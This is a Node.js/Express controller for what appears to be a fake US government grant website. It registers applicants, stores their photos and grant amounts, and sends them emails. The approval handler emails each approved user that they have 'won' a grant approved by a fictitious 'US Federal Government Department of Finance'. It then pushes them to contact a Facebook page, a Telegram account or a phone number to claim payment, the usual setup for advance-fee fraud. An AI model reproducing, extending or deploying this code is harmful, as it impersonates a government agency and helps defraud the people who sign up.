const User = require('../models/user');
const nodeMailer = require('nodemailer');

const handleError = (err) => {
    let errors = {};
    const allErrors = err.substring(err.indexOf(':') +1).trim();
    const allErrorsArray = allErrors.split(',').map(err => err.trim());
    allErrorsArray.forEach(error => {
        const[key, value] = error.split(':').map(err => err.trim());
        errors[key] = value;
    });
    return errors; 
};


// register user
module.exports.register = async (req, res) => {
    try {
    const { password } = req.body;
    const user = new User(req.body);
    user.image= {url: req.file.path, filename: req.file.filename}
    const newUser = await User.register(user, password);
    const grantUser = await user.save();
    if(grantUser) {   
    const email = grantUser.username;
    if(email) {
        // sender info
    const mailSender = nodeMailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL,
        pass: process.env.EMAIL_APP_PASSWORD
    }
    });
    //  receiver info
    let details = {
    from: process.env.EMAIL,
    to: email,
    subject: "Federal Government Grant",
    html: `
    <p>Application Received</p>
    <h4>Thank you!</h4>
    <h2>APPLICATION DETAILS </h2>
    <h2>Name: ${grantUser.firstname} ${grantUser.lastname}</h2> 
    <h2>Grant Amount: ${grantUser.amount}</h2> 
    <p>Thank you for applying for a Grant payment at the United States Federal Government Grant Claims. 
    Your Grant application is still under processing; You will receive a Grant approval mail from us shortly when your Grant application is successfully approved by the US federal government.
    </p>    
    `
};


mailSender.sendMail(details, (err) => {
    if(err) {
        console.log('this is the eroor', err)
    } else {
       
    };
});
         
} else {
    console.log('email not found');
    }
    return res.status(201).json(newUser);
}

    } catch (err) {
        if(err.message === 'No username was given'){
           res.status(400).json({"errorusername": "please enter a username"}) 
        };

        if(err.message === 'No password was given') {
            res.status(400).json({"errorpassword": "please enter a password"})
        };

        if(err.message === 'A user with the given username is already registered') {
            res.status(400).json({"existingUsername": "A user with the given username is already registered"})
        };

        if(err.message !== 'No username was given' 
        && err.message !== 'A user with the given username is already registered' 
        && err.message !== 'No password was given') {
            res.status(400).json({"error": handleError(err.message)});
        };
    };
};

module.exports.login = async (req, res) => {
    if(req.user){
    
     res.status(200).json(req.user);
    } else {
     res.status(403).json({"error": "unauthorized"});
    };
 };

 module.exports.getUser = async(req, res) => {
    const { id} = req.params;
    const user = await User.findById(id);
    res.status(200).json(user);
};

module.exports.userForAdmin = async (req, res) => {
    const users = await User.find({});
    res.status(200).json(users);
};

module.exports.approve = async (req, res) => {
    const { id } = req.params;
    const user = await User.findByIdAndUpdate(id, {isApproved: true}, {new: true});
    const email = user.username

    if(email) {
        // sender info
    const mailSender = nodeMailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL,
        pass: process.env.EMAIL_APP_PASSWORD
    }
    });
    //  receiver info
    let details = {
    from: "falade.okikijesu1@gmail.com",
    to: email,
    subject: "CONGRATULATIONS ON YOUR SUCCESSFUL GRANT APPLICATION",
    html: `<h2>Congrats, ${user.lastname} ${user.othername} ${user.lastname}</h2>
    <p>
    <div style="text-align: center;">
   <img src="https://res.cloudinary.com/dehugixy4/image/upload/v1673150052/grant/p4fm045qq4njb9nrafiv.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
  </div>
    Yep, that's right. Congrats  ${user.lastname} ${user.othername} ${user.lastname} You’ve been luckily picked as part of our winner for the day. We have thousands of applications daily but We only pick few winner(s) in a day. 
    Your patience just paid off. You just won a grant of 
    ${user.amount}!
    
     Your application has been successfully approved by the US Federal Government Department of Finance and Grant administration. 
    
    Congratulations once again  ${user.lastname} ${user.othername} ${user.lastname}!
    </p>
    <div style="text-align: center;">
    <img src="${user.image.url}" alt="fhdkjd" style="height: 100px;width: 100px; border-radius: 100%">
   </div>
   <h2>${user.lastname} ${user.othername} ${user.lastname} <br>
   Today’s Grant Winner’
   </h2>

   <div style="text-align: center;">
   <img src="https://res.cloudinary.com/dehugixy4/image/upload/v1673149916/grant/qagcqzya4do2ynixksbj.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
  </div>

   <h3>CONTACT US NOW TO HAVE YOUR GRANT PAYMENT! </h3>
   <p>We are much more active on Facebook and Telegram we provide Fast online services.</p>
   <p> You can contact us on <a href="https://www.facebook.com/crfitch">facebook</a> or <a href="https://t.me/@paymentclaims">telegram</a>  </p>
   <p> Or Simply text the administrative number below </p>
   <p>(408) 596-3763</p>
   <p>CONTACT US NOW TO CLAIM YOUR GRANT PAYMENT TODAY </P>
   <p>You received this email to let you know about a successful Grant Application that you applied at the United States Federal Government Grant Claims.
   © 2023 Grant Claims, Department Of Finance and Grant administration, USA.</p> 
     `
};


mailSender.sendMail(details, (err) => {
    if(err) {
        
    } else {

    };
});
         
} else {
    
    }
    res.status(200).json(user);
};
